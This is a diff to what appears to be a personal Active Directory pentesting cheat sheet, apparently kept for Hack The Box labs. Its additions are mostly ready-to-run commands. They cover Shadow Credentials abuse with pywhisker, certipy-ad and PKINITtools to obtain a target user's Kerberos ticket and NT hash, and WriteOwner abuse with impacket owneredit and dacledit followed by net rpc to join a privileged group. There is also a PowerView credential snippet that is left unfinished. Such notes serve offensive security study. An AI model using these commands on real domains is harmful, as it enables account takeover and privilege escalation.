@@ -21,6 +21,7 @@
   * <<Groups, Groups>>
   * <<WriteDacl, WriteDacl>>
   * <<GPO, GPO abuse>>
+  * <<write,Write Owner>>
 - <<crack, Hashcat and John>>
   * <<hashcat, Hashcat>>
   * <<john, John>>
@@ -280,17 +281,70 @@ Changing pass by tool `BloodyAD`
 ```bash
 bloodyAD --host "$target" -d 'dc01.$target_domain' -u  'user' -p  'pass' set password 'user2' 'pass2'
 ```
-
 So it's can be as "Change password of user2 by user with pass and change to pass2",
+
+
+Changing pass in PowerShell by `PowerView.ps1`
+
+```bash
+$SecPassword = ConvertTo-SecureString 'FuckPass@!' -AsPlainText -Force
+$Cred = New-Object System.Management.Automation.PSCredential('domain\target_user', $SecPassword)
+```
+
+
 
 [[generetic2]]
 === GenericWrite
+*Method 1*
 
-This permision over user can be used for changing atributes of target object so can be automated by tool `targetedKerberoast.py` , by atribute *servicePrincipalName* adds SPN and do kerberoasting. Could be cathed a hash of target user
+This permision over user can be used for changing atributes of target object so can be automated by tool `targetedKerberoast.py` , by atribute *servicePrincipalName* adds SPN and do kerberoasting. Could be cathed a hash of target user catch kerberos hash of user
 
 ```bash
 python3 targetedKerberoast.py -v -d '$target_domain' -u 'username' -p 'password' 
 ```
+*Method 2*
+Can be logged as targed user to system when a password is strong or some service accounts, tool which can be used `pywhisker` && `certipy-ad` && `PKINITtools` 
+
+1.Check if target user have *Shadow Credentials* 
+
+```bash
+pywhisker -d domain -u "username" -p "password" --target "target_object" --action "list"
+```
+
+2.Add *KeyCredentialLink* to target user in AD , it is doing because after taking *Kerberos TGT* as a target user
+
+```bash
+pywhisker -d domain -u "username" -p "password" --target "target_object" --action "add" --filename some_file
+```
+
+3.Add *Shadow Creds* to user , export `.pfx` certificate can be used only `certipy-ad` without `pywhisker`
+
+```bash
+certipy-ad shadow auto -u username@domain -p password -account target_user
+```
+
+4.Take a key from `pywhisker` , creates a `.ccache` file , takes Ticket Granting Ticket (*TGT*) , file `.ccache` it's where to write a TGT ticket
+
+```bash
+python3 ~/htb/Windows/PKINITtools/gettgtpkinit.py -cert-pfx "username.pfx" -pfx-pass '01mdadw0wadasdwm3ffL' domain/target_username target_username.ccache
+```
+
+4.1 Export KRB5CCNAME as a file `.ccache`
+
+```bash
+export KRB5CCNAME=target_username.ccache 
+```
+
+5.Take a `NTLM` hash of target user, after can be logged in `evil-winrm`, Tools use a ASP-REP Roasting via PRIKIT key
+
+```bash
+python3 ~/htb/Windows/PKINITtools/getnthash.py -key 'c5cbc1fa0e5b8d29091864f2b1d16c4ecdcdfe7dcb331b0b4bc87d49502212dc' domain/target_username
+```
+
+Links:
+ https://github.com/ShutdownRepo/pywhisker[pywhisker]
+ https://www.hackingarticles.in/shadow-credentials-attack/[shadow-credentials-attack]
+
 
 [[DCSync]]
 === DCSync 
@@ -351,6 +405,30 @@ $cred = ConvertTo-SecureString 'some_pass' -AsPlainText -Force
 # 
 set-domainuserpassword $target_user -accountpassword $cred
 ```
+
+[[write]]
+== Write Owner
+
+So is's a perm which be demostrated over some group so main goal to make low priv user that have a *WriteOwner* perms over group and in goal low-priv user must be a *Group Owner* in group
+
+1. Change a owner of object
+
+```bash
+impacket-owneredit -action write -new-owner 'low_priv_usr' -target-dn 'CN=Group_with_replacing,CN=Users,DC=domain.,DC=.domain' 'domain'/'low_priv_usr':'password' -dc-ip 10.10.10.10
+```
+2. Give yourself a perm to change other users in group
+
+```bash
+impacket-dacledit -action 'write' -rights 'WriteMembers' -principal 'low_priv_usr' -target-dn 'CN=Group_with_replacing,CN=Users,DC=domain.,DC=.domain' 'domain'/'low_priv_usr':'password' -dc-ip 10.10.10.10
+```
+
+3. After we can add yourself to target group with write perms to other users can be done with `BloodyAD` or `net rpc` or others i will go with `net rpc`
+
+```bash
+net rpc group addmem "target_group" "low_priv_user" -U "domain"/"low_priv_user"%'password' -S "dns_domain"
+```
+
+https://www.hackingarticles.in/abusing-ad-dacl-writeowner/[abusing-ad-dacl-writeowner]
 
 [[GPO]]
 === GPO abuse
@@ -456,6 +534,8 @@ certipy-ad template -u 'user@domain' -p 'pass' -template template_name -dc-ip 10
 ```
 
 This step is used after `find` to make a template vulnerable to *ESC1* by exploiting dangerous privileges
+
+ESC 9 vuln cert https://www.hackingarticles.in/adcs-esc9-no-security-extension/[exploitation]
 
 [[rm]]
 == Remote Managment
